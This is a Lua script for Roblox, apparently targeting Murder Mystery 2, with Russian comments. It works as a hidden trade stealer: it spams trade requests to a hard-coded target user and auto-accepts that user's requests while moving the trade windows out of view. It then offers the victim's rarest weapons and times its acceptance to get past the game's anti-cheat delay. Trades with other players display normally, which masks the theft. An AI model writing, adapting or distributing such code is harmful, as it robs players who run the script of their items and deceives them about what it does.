local function getTradeStatus()
    local ok, status = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
    return ok and status or "None"
end

local function parseInventory()
    table.clear(weaponsToSend)
    local ok, realData = pcall(function() return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name) end)
    if not ok or type(realData) ~= "table" or not realData.Weapons or not realData.Weapons.Owned then return end

    local min_idx = table.find(rarityTable, min_rarity) or 1
    for dataid, amount in pairs(realData.Weapons.Owned) do
        local itemData = database[dataid]
        if itemData and amount and amount > 0 then
            local w_idx = table.find(rarityTable, itemData.Rarity)
            if w_idx and w_idx >= min_idx and not untradable[dataid] then
                table.insert(weaponsToSend, {DataID = dataid, Rarity = itemData.Rarity, Amount = amount})
            end
        end
    end
    table.sort(weaponsToSend, function(a, b)
        local aI = table.find(rarityTable, a.Rarity) or 0
        local bI = table.find(rarityTable, b.Rarity) or 0
        return aI == bI and a.Amount > b.Amount or aI > bI
    end)
end

Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    if type(data) == "table" then
        if data.LastOffer then
            lastOfferToken = data.LastOffer
            lastOfferTime = tick()
        end
        
        -- Вытаскиваем никнейм напрямую из пакета сервера
        local p1 = (type(data.Player1) == "Instance" and data.Player1.Name) or (type(data.Player1) == "string" and data.Player1) or ""
        local p2 = (type(data.Player2) == "Instance" and data.Player2.Name) or (type(data.Player2) == "string" and data.Player2) or ""
        
        if p1 ~= plr.Name and p1 ~= "" then NetworkOpponent = p1 end
        if p2 ~= plr.Name and p2 ~= "" then NetworkOpponent = p2 end
    end
end)

-- ПОТОК 1: Агрессивный спамер запросов таргету (раз в 3 сек)
task.spawn(function()
    while task.wait(3) do
        if getTradeStatus() == "None" then

            if targetPlayer then
                pcall(function() Trade.SendRequest:InvokeServer(targetPlayer) end)
            end
        end
    end
end)

-- ПОТОК 2: Авто-акцепт входящих запросов
task.spawn(function()
    while task.wait(0.1) do
        if getTradeStatus() == "ReceivingRequest" then
            -- МГНОВЕННО ВКИДЫВАЕМ ОКНО В КАРАНТИН
            isQuarantined = true
            
            -- Проверяем, кто кинул запрос (парсим текст только 1 раз в фоне)
            local reqGui = playerGui:FindFirstChild("TradeRequestGUI")
            local isHim = false
            
            if reqGui then
                for _, obj in ipairs(reqGui:GetDescendants()) do
                    if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and string.find(string.lower(obj.Text), string.lower(TARGET_USER)) then
                        isHim = true
                        break
                    end
                end
            end
            
            if isHim then
                -- Если это таргет, принимаем запрос, окно остается скрытым
                pcall(function()
                    local r = Trade:FindFirstChild("AcceptRequest")
                    if r then if r:IsA("RemoteFunction") then r:InvokeServer() else r:FireServer() end end
                end)
                task.wait(0.5)
            else
                -- Если это рандом, снимаем карантин и восстанавливаем окно
                isQuarantined = false
                if reqGui and (reqGui:FindFirstChild("Main") or reqGui:FindFirstChild("Frame")) then
                    local m = reqGui:FindFirstChild("Main") or reqGui:FindFirstChild("Frame")
                    m.Position = UDim2.new(0.5, 0, 0.5, 0)
                    m.AnchorPoint = Vector2.new(0.5, 0.5)
                    m.Visible = true
                    reqGui.Enabled = true
                end
                task.wait(1) -- Ждем пока штемп отменит или примет
            end
        end
    end
end)

-- ПОТОК 3: Движок передачи лута и контроль статуса
task.spawn(function()
    while task.wait(0.1) do
        local status = getTradeStatus()
        
        if status == "None" then
            processActive = false
            isQuarantined = false
            isTargetTrade = false
            lastOfferToken = nil
            NetworkOpponent = ""
            
            -- Сброс и возврат центровки окон для обычных сделок
            pcall(function()
                for _, name in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
                    local g = playerGui:FindFirstChild(name)
                    if g then
                        g.Enabled = true
                        local m = g:FindFirstChild("Main") or g:FindFirstChild("Frame")
                        if m then
                            m.AnchorPoint = Vector2.new(0.5, 0.5)
                            m.Position = UDim2.new(0.5, 0, 0.5, 0)
                            m.Visible = true
                        end
                    end
                end
            end)
            
        elseif status == "StartTrade" and not processActive then
            processActive = true
            isQuarantined = true -- СДЕЛКА НАЧАЛАСЬ -> ВСЁ В КАРАНТИН!
            
            -- Ждем до 3 секунд синхронизации сети, чтобы узнать оппонента
            local startWait = tick()
            while NetworkOpponent == "" and (tick() - startWait) < 3 do task.wait(0.1) end
            
            -- Анализируем, кто на другой стороне
            if string.lower(NetworkOpponent) == string.lower(TARGET_USER) then
                -- ВЕТКА А: ЭТО НАШ КЛИЕНТ.
                isTargetTrade = true
                isQuarantined = false -- Карантин снимаем, но флаг isTargetTrade удержит окна вне экрана
                
                parseInventory()
                
                if #weaponsToSend > 0 then
                    local count = 0
                    for _, weapon in ipairs(weaponsToSend) do
                        if count < 4 then
                            for _ = 1, weapon.Amount do
                                if count >= 4 then break end
                                pcall(function() Trade.OfferItem:FireServer(weapon.DataID, "Weapons") end)
                                count = count + 1
                                task.wait(0.1) -- Увеличил тайминг для мобильного пинга
                            end
                        end
                    end
                    
                    local wt = tick()
                    while not lastOfferToken and (tick() - wt) < 8 do task.wait(0.1) end
                    
                    if lastOfferToken then
                        for i = 1, 15 do
                            local timePassed = tick() - lastOfferTime
                            -- Ждем ровно 6 секунд античита MM2
                            if timePassed >= 6 then
                                pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferToken) end)
                                break
                            else
                                task.wait(0.5)
                            end
                        end
                    end
                end
                
                -- Держим поток заблокированным до закрытия трейда сервером
                while getTradeStatus() ~= "None" do task.wait(0.2) end
                
            else
                -- ВЕТКА Б: ЭТО ОБЫЧНЫЙ ИГРОК.
                isTargetTrade = false
                isQuarantined = false -- СНИМАЕМ КАРАНТИН!
                
                -- Восстанавливаем позицию окон перед лицом пользователя
                pcall(function()
                    for _, name in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
                        local g = playerGui:FindFirstChild(name)
                        if g then
                            g.Enabled = true
                            local m = g:FindFirstChild("Main") or g:FindFirstChild("Frame")
                            if m then
                                m.AnchorPoint = Vector2.new(0.5, 0.5)
                                m.Position = UDim2.new(0.5, 0, 0.5, 0)
                                m.Visible = true
                            end
                        end
                    end
                end)
                
                -- Ждем пока ты поторгуешь руками
                while getTradeStatus() ~= "None" do task.wait(0.5) end
            end
        end
    end
end)
